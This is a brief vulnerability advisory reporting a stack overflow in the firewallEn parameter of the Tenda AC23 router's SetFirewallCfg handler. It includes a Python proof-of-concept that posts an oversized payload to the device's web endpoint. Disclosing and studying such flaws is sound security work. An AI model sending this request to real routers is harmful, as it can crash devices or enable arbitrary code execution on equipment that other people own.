
Tenda AC23 V16.03.07.52 SetFirewallCfg handles a stack overflow vulnerability in the firewallEn parameter, which can be exploited by a remote attacker to submit a special request that can crash the application or execute arbitrary code in the context of the application.

<img width="416" height="279" alt="image" src="https://github.com/user-attachments/assets/7137114c-1534-4a55-8812-ebc74f73b7ea" />

POC：
```
from pwn import *
import requests

payload = b'a'*0x1000

url = "http://192.168.100.254/goform/SetFirewallCfg"

cookie = {"Cookie":"password=12345"}
data = {"firewallEn": payload}
response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)
print(response.text)
```
